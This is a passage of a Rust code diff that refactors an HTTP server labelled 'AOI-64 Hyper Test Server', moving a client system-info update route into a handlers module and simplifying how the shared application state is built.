-                client_id: Some(client_id.clone()),
-                command_id: Some(command_id.clone()),
-                details: None,
-            });
-
-            Ok(json_response(
-                json!({
-                    "status": "System info update requested",
-                    "command_id": command_id,
-                    "client_id": client_id
-                }),
-                StatusCode::OK,
-            ))
-        }
+        (Method::POST, "/api/clients/update-sysinfo") => handlers::api_clients_update_sysinfo(req, &state).await,
 
         _ => Ok(json_response(
             json!({"error":"Not Found"}),
@@ -2089,14 +1461,7 @@ async fn handle(
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    let state = Arc::new(AppState {
-        command_queue: Mutex::new(Vec::new()),
-        response_log: Mutex::new(Vec::new()),
-        activity_log: Mutex::new(Vec::new()),
-        client_info: Mutex::new(HashMap::new()),
-        notify: Notify::new(),
-        _server_start: unix_time(),
-    });
+    let state = Arc::new(AppState::new());
 
     println!("============================================================");
     println!("🚀 AOI-64 Hyper Test Server");
